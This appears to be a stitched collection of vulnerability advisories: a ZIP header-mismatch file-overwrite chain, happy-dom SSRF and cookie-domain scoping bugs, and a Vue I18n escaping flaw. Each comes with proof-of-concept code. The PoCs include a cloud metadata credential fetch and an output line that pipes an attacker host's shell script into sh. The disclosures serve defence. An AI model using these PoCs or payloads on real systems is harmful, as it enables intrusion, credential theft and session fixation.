    ZipStreamReader::new(Cursor::new(&malicious_zip)).extract(victim_dir).unwrap();

    // 5. Impact Verification
    let compromised = fs::read_to_string(&target_script).unwrap();
    assert!(!compromised.contains("SERVICE HEALTHY")); // DoS Confirmed
    assert!(compromised.contains("PWNED ROOT"));       // RCE Confirmed
}
```

### Verified Test Execution Output
```text
running 1 test
==================================================================
Dual-Header Security Gateway Evasion
Exploit Chain: Gateway Evasion -> Arbitrary Overwrite -> RCE & DoS
==================================================================
[VICTIM SERVER STATE - BEFORE ATTACK]
Existing Content:
SERVICE IS RUNNING NORMALLY

--- [STEP 1: SECURITY GATEWAY INSPECTION] ---
[SECURITY GATEWAY] Auditing entry #0: 'doc_report.pdf'
[GATEWAY VERDICT]: Ok(())
[VULNERABILITY PROOF 1/3]: Security gateway was 100% BLIND to 'cron_worker.sh'!

--- [STEP 2: BACKEND EXTRACTION (ZipStreamReader)] ---
Backend server unzips approved archive into production directory.

--- [STEP 3: POST-ATTACK IMPACT VERIFICATION] ---
[VICTIM SERVER STATE - AFTER ATTACK]
Compromised Content:
curl -s https://attacker.c2/shell | sh
echo 'PWNED: FULL ROOT TAKEOVER'
```

---

## Impact
An attacker can construct a crafted archive whose Central Directory displays a benign filename (doc_report.pdf) that is inspected and approved by upstream security gateways (antivirus scanners, mail filters, upload firewalls), while automated backend ingestion pipelines or microservices using ZipStreamReader extract an arbitrary or malicious file (overwriting e.g. cron_worker.sh or critical system binaries). Because an adversary can overwrite existing files on disk, this vulnerability leads to Security Control Bypass, Arbitrary File Overwrite, Complete Denial of Service, and Remote Code Execution (RCE) in situations where a tool relying on the central directory trusts a tool that relied on the local file headers or vice-versa.

**Who is Impacted:**
- Automated ingestion microservices, SaaS platforms, and backend workers that extract user-submitted ZIP files.
- Enterprise architectures where security verification (AV scanning, extension whitelisting) is decoupled from extraction (e.g. gateway audits Central Directory via CDFH before handing off extraction to streaming extractors).
- Containerized workloads where overwriting local configuration files or executable scripts leads to host/container escape and complete service disruption.

## Summary
happy-dom v20.8.9 makes real server-side HTTP requests to arbitrary URLs when parsing HTML containing `<iframe>` or `<link rel="stylesheet">` elements. This behavior is enabled by default (`disableIframePageLoading: false`, `disableCSSFileLoading: false`). When an application uses happy-dom to parse untrusted HTML on the server side, an attacker can trigger Server-Side Request Forgery by embedding these elements.

## Affected Versions
- happy-dom <= 20.8.9 (latest)

## Vulnerable Behavior

By default, happy-dom has:
- `disableIframePageLoading: false` — iframes fetch their `src` URL via real HTTP requests
- `disableCSSFileLoading: false` — `<link>` stylesheets fetch their `href` URL via real HTTP requests

When untrusted HTML is parsed, these elements trigger real server-side HTTP requests to whatever URLs are specified. No special configuration or opt-in is needed.

## Proof of Concept

### Verified test (attacker server receives requests):
```javascript
const http = require('http');
const { Window } = require('happy-dom');

// Start attacker server
const srv = http.createServer((req, res) => {
    console.log(`SSRF HIT: ${req.method} ${req.url}`);
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end('<html><body>stolen</body></html>');
});

srv.listen(9995, () => {
    // iframe SSRF — happy-dom makes a real GET request
    const win1 = new Window({ url: 'http://localhost' });
    win1.document.write('<html><body><iframe src="http://127.0.0.1:9995/iframe-ssrf"></iframe></body></html>');

    // stylesheet SSRF — happy-dom makes a real GET request
    const win2 = new Window({ url: 'http://localhost' });
    win2.document.write('<html><head><link rel="stylesheet" href="http://127.0.0.1:9995/stylesheet-ssrf"></head><body></body></html>');
});
```

**Test output:**
```
SSRF HIT: GET /iframe-ssrf
SSRF HIT: GET /stylesheet-ssrf
```

Both requests confirmed received by the attacker server. Tested on happy-dom v20.8.9, Node.js v22.17.0, macOS.

### Cloud metadata attack scenario:
```javascript
const { Window } = require('happy-dom');
const win = new Window({ url: 'http://localhost' });

// Attacker-controlled HTML triggers fetch to AWS metadata endpoint
win.document.write('<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe></body></html>');
```

## Impact
- **Cloud credential theft** — `<iframe src="http://169.254.169.254/...">` fetches AWS/GCP/Azure metadata
- **Internal network scanning** — probe internal services and ports
- **Data exfiltration** — read responses from internal APIs
- **Affects any server-side use case** — web scraping, email HTML rendering, SSR, testing with external HTML input

## Suggested Fix
Change defaults to disable external resource loading:
```javascript
disableIframePageLoading: true,  // change from false
disableCSSFileLoading: true,     // change from false
```

Or add URL validation to block private IP ranges and cloud metadata endpoints before fetching.

### Summary

When `escapeParameter` is enabled (`escapeParameterHtml` in the Legacy API), Vue I18n escapes the interpolation parameters before formatting a message. `escapeParams()` escapes either the list values or the named values, but not both: the two branches are joined by `else`. When a single call passes both, for example `t(key, ['...'], { named: { ... } })`, the named values reach the message without being escaped.

### Details

`escapeParams()` in [`packages/core-base/src/translate.ts` (v11.4.13)](https://github.com/intlify/vue-i18n/blob/v11.4.13/packages/core-base/src/translate.ts):

```ts
function escapeParams(options: TranslateOptions) {
  if (isArray(options.list)) {
    options.list = options.list.map(item => (isString(item) ? escapeHtml(item) : item))
  } else if (isObject(options.named)) {
    // ...escapes the named values
  }
}
```

`t(key, list, options)` is a public overload, and `TranslateOptions` has a `named` field, so a call can carry both. The list is checked first, and the named values are then left as they are.

The translated string still goes through `sanitizeTranslatedHtml()` (added for CVE-2025-53892), which neutralizes event handler attributes and `javascript:` URLs. Other markup in the named values, such as links and forms, is inserted as is. Before the fix for GHSA-83rm-6c8r-g728, an `<iframe srcdoc>` in a named value also passes the sanitizer, and script runs. Versions without the sanitizer (before 9.14.5, 10.0.8 and 11.1.10, and 12.0.0-alpha.1 to alpha.3) insert the named values as HTML without any further check.

`<i18n-t>` is not affected: it passes either list or named values, never both, and it does not render translations as HTML.

### PoC

```js
import { createI18n } from 'vue-i18n'

const i18n = createI18n({
  legacy: false,
  locale: 'en',
  escapeParameter: true,
  messages: {
    en: { withList: '{0} {name}', withoutList: '{name}' }
  }
})
const t = i18n.global.t

t('withoutList', { name: '<b>x</b>' })
// &lt;b&gt;x&lt;&#x2F;b&gt;      escaped

t('withList', ['a'], { named: { name: '<b>x</b>' } })
// a <b>x</b>                   not escaped (v11.4.13)
```

### Impact

Applications are affected when they enable `escapeParameter`, render translations as HTML (for example with `v-html`), and pass untrusted named values in the same call as a list. The named values are inserted as markup: phishing links, forms, or layout changes. Together with GHSA-83rm-6c8r-g728, or on versions without the sanitizer, this leads to script execution (DOM-based XSS).

### Patches

Fixed in 11.4.14 and 12.0.0-alpha.5. `escapeParams()` now escapes both the list and the named values.

The fix also stops rewriting the named object that the caller passes. Before, the values of that object were replaced with their escaped form, so a second call with the same object escaped them twice.

v9 and v10 are no longer supported and will not be fixed. Please migrate to v11.

### Workarounds

- Do not pass list and named values in the same call when `escapeParameter` is enabled.
- Do not render translations that can contain untrusted values with `v-html`. Use component interpolation (`<i18n-t>`) instead.

### Summary
A cookie-scoping bug in happy-dom lets an attacker origin set cookies that a victim origin then receives, diverging from browser semantics.

### Details
happy-dom matches Domain=example.com against notexample.com (endsWith without a DNS-label boundary), diverging from browser semantics (verified 20.11.6 npm latest: cookieMatchesURL(Domain=example.com, url=http://notexample.com) = true). Relevant where happy-dom is used for SSR/prerender cookie handling. Matching in src/cookie/CookieContainer.ts.

### PoC

Run:
```bash
node poc-happydom-cookie-domain.js
```

Full proof-of-concept source (poc-happydom-cookie-domain.js):
```js
// PoC: happy-dom cookie-domain scoping gap -> cross-origin cookie injection / session fixation
// Chain: app (window at http://localhost:PORT2) fetches attacker server (http://127.0.0.1:PORT1)
//        -> attacker Set-Cookie with Domain=localhost (a host that is NOT a suffix of 127.0.0.1)
//        -> happy-dom stores it (a real browser rejects: RFC 6265 §5.3.6-7 + PSL)
//        -> app's same-origin fetch to http://localhost:PORT2/api/account carries the forged cookie
// Run:  cd C:/Users/rncb0/AppData/Local/Temp/0day && node poc/poc-happydom-cookie-domain.js
const http = require('http');
const { Window } = require('happy-dom');

const ATK_PORT = 19311; // attacker server, 127.0.0.1
const VIC_PORT = 19312; // victim server, localhost

let victimReceivedCookies = [];

let attackerSetCookie = `session=FORGED_BY_ATTACKER; Domain=localhost; Path=/; SameSite=None; Secure`;

const attacker = http.createServer((req, res) => {
  if (req.method === 'OPTIONS') {
    // CORS preflight (happy-dom enforces same-origin policy with a preflight; the
    // attacker trivially answers it — an attacker-controlled server always can)
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Allow-Headers': '*'
    });
    res.end();
    return;
  }
  res.writeHead(200, {
    'content-type': 'image/gif',
    'Access-Control-Allow-Origin': '*',
    // Attacker claims Domain=localhost even though it is serving from 127.0.0.1.
    // A browser MUST ignore this cookie (RFC 6265: domain-attribute not a domain-match of
    // the request-host; localhost is also on the Mozilla PSL).
    'Set-Cookie': attackerSetCookie
  });
  res.end('GIF89a');
});

const victim = http.createServer((req, res) => {
  victimReceivedCookies.push({ path: req.url, cookie: req.headers['cookie'] || null });
  res.writeHead(200, { 'content-type': 'application/json' });
  res.end(JSON.stringify({ ok: true, user: 'alice' }));
});

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

async function runScenario(scenario) {
  victimReceivedCookies = [];
  const win = new Window({
    url: `http://localhost:${VIC_PORT}/`,
    settings: {
      enableJavaScriptEvaluation: true,
      suppressInsecureJavaScriptEnvironmentWarning: true
    }
  });
  try {
    if (scenario === 'no-plant-control') {
      // Control: app NEVER contacts attacker -> victim must receive NO cookie
      await win.fetch(`http://localhost:${VIC_PORT}/api/account`);
    } else if (scenario === 'honest-domain-control') {
      // Control: attacker sets Domain=127.0.0.1 (its own host, honest)
      // -> cookie must NOT leak to localhost victim
      attackerSetCookie = `session=FORGED_BY_ATTACKER; Domain=127.0.0.1; Path=/; SameSite=None; Secure`;
      await win.fetch(`http://127.0.0.1:${ATK_PORT}/plant`);
      await win.fetch(`http://localhost:${VIC_PORT}/api/account`);
    } else {
      // attack: app fetches attacker content (scraping/SSR/third-party resource)
      await win.fetch(`http://127.0.0.1:${ATK_PORT}/plant`);
      await win.fetch(`http://localhost:${VIC_PORT}/api/account`);
    }
    await sleep(150);
    return victimReceivedCookies;
  } finally {
    win.happyDOM.abort();
  }
}

async function main() {
  await new Promise((r) => attacker.listen(ATK_PORT, '127.0.0.1', r));
  await new Promise((r) => victim.listen(VIC_PORT, 'localhost', r));

  console.log('=== happy-dom cookie-domain scoping PoC ===\n');

  const attack = await runScenario('attack');
  console.log('[ATTACK] app fetched attacker (127.0.0.1) then victim (localhost)');
  attack.forEach((e) => console.log(`  victim got ${e.path}: Cookie=${JSON.stringify(e.cookie)}`));
  const forged = attack.some((e) => e.cookie && e.cookie.includes('session=FORGED_BY_ATTACKER'));
  console.log(`  -> forged cookie delivered to victim: ${forged ? 'YES (VULNERABLE)' : 'no'}`);

  const noPlant = await runScenario('no-plant-control');
  console.log('\n[CONTROL] app never contacts attacker');
  noPlant.forEach((e) => console.log(`  victim got ${e.path}: Cookie=${JSON.stringify(e.cookie)}`));

  const honest = await runScenario('honest-domain-control');
  console.log('\n[CONTROL] attacker sets honest Domain=127.0.0.1 only');
  honest.forEach((e) => console.log(`  victim got ${e.path}: Cookie=${JSON.stringify(e.cookie)}`));

  // unit proof: document.cookie setter also accepts non-suffix domains (browser rejects)
  const win2 = new Window({
    url: `http://localhost:${VIC_PORT}/`,
    settings: { enableJavaScriptEvaluation: true, suppressInsecureJavaScriptEnvironmentWarning: true }
  });
  win2.document.cookie = `admin=1; Domain=com; Path=/`; // PSL public suffix!
  const readBack = win2.document.cookie;
  console.log(`\n[UNIT] document.cookie = 'admin=1; Domain=com' -> read back: '${readBack}'`);
  console.log(`  -> browser: REJECTED (public suffix); happy-dom: ${readBack.includes('admin=1') ? 'ACCEPTED' : 'rejected'}`);
  win2.happyDOM.abort();

  // unit proof: endsWith boundary bug (SameSite=None cookie -> sent to any host ending with the domain)
  const { default: CookieURLUtility } = require('happy-dom/lib/cookie/urilities/CookieURLUtility.js');
  const matchesBoundary = CookieURLUtility.cookieMatchesURL(
    { key: 'k', value: 'v', originURL: new URL('http://attacker.example/'), domain: 'example.com', path: '/', secure: true, sameSite: 'None' },
    new URL('https://notexample.com/')
  );
  console.log(`\n[UNIT] cookieMatchesURL(Domain=example.com, SameSite=None, url=http://notexample.com) = ${matchesBoundary}`);
  console.log(`  -> 'notexample.com'.endsWith('example.com') is TRUE (no DNS-label boundary); browser: no match`);

  attacker.close();
  victim.close();
  process.exit(0);
}

main().catch((e) => { console.error(e); process.exit(1); });

```

